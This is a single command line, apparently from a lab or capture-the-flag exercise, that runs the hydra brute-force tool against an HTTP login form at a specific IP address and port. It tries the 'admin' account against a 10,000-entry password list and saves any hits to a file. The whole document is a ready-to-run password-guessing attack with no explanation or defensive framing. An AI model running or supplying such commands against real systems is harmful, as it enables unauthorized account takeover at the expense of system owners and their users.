hydra 88.198.233.174 -s 33508 http-form-post "/index.php:password=^PASS^:Invalid" -l admin -P 10kpass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
